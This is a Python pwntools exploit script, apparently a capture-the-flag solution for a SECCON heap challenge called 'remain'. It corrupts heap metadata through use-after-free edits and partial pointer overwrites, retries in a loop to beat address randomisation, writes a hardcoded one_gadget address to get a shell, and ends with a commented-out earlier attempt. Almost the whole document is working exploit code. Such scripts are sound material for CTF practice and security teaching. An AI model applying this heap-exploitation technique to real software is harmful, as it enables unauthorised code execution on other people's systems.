#!/usr/bin/env python2

from pwn import *

BINARY = './remain'
HOST, PORT = 'one.chal.seccon.jp', 18357

elf = ELF(BINARY)

if args.REMOTE:
	libc = ELF('./libc-2.27.so')
else:
	libc = ELF('./libc.so.6')

def start():
	if not args.REMOTE:
		return process(BINARY)
	else:
		return remote(HOST, PORT)

def get_base_address(proc):
	return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(p)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    gdb.attach(p,gdbscript=script)

def add(content):
	p.sendlineafter('> ', '1')
	p.sendafter('> ', content[:-1])

def edit(idx, content):
	p.sendlineafter('> ', '2')
	p.sendlineafter('> ', str(idx))
	p.sendafter('> ', content)

def free(idx):
	p.sendlineafter('> ', '3')
	p.sendlineafter('> ', str(idx))

context.terminal = ['tmux', 'new-window']
context.log_level = 'critical'

while True:
	p = start()

	add('A'*0x18 + p64(0x51) + 'A'*0x20) #0
	add(p64(0x21)*9) # 1

	free(1)
	free(0)

	edit(0, p16(0x5690))
	add('A'*8) # 2

	try:
		add(p64(0) + p64(0x21) + p64(0)*3 + p64(0x21)) # 3
		free(1)
		free(0)
		edit(0, p8(0x80))
		add('A'*0x18 + p64(0x51)) # 4
		add('C'*8) # 5
		free(5)
		free(0)
		add('A'*0x18 + p64(0x421)) # 6
		edit(0, 'BBBBBBBB')
		free(5)
		edit(5, p16(0xfc30))
		edit(0, 'A'*0x18 + p16(0x51))
		add('/bin/sh\x00') # 7
		one_gadget = 0x7fb074b5b000 + 0x106ef8
		add(p64(one_gadget)) # 8
		add('A')
		if args.GDB:
			debug([])
		break
	except:
		p.close()
		continue
	p.close()

p.interactive()

'''
while True:
	p = start()

	add('A'*0x10 + p64(0x421)) # 0
	add(p64(0x21)*9) # 1

	free(1)
	free(0)

	edit(0, p8(0xa0))
	add('A'*8) # 2
	add('A'*8 + p64(0x51) + p64(0) + 'A') # 3

	free(1)
	free(0)

	edit(0, p16(0x06c0))
	add('A'*0x38 + p8(0x51)) # 4
	try:
		add(p64(0) + p64(0x21) + p64(0)*3 + p64(0x21)) # 5
		free(3)
		add('A'*8 + p64(0x421)) # 6
		free(1)
		edit(1, p16(0x7760))
		if args.GDB:
			debug([])
		break
	except:
		p.close()
'''